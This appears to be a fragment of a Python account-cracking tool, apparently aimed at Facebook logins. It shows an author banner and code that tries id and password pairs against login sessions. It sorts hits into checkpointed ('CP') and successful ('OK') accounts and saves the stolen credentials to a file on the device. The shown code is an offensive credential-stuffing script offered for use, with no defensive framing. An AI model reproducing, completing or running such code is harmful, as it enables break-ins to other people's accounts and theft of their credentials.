...
def banner():
 ...
 | |____   | |  | |_) | |____| | \ \ 
  ...
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} AHMED                {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H} prince king hu yawr{N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+************         {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}private.                  {N}    {H}  ║
  {H}  ║{P}[{H}•{P}] Status    : {H}PREMIUM {P}     {N}      {H}  ║
   {H} ║{P}[{H}•{P}] Network   : {H}3G{N}, {H}4G/5G{N}, {H}ON{N}     {H}      ║
   {H} ║{P}[{H}•{P}] Version   : {H}test                                        ║
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;33mAHMED-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/AHMED-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                ok+=1
                print(f'\r{P} [{H}AHMEDO-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
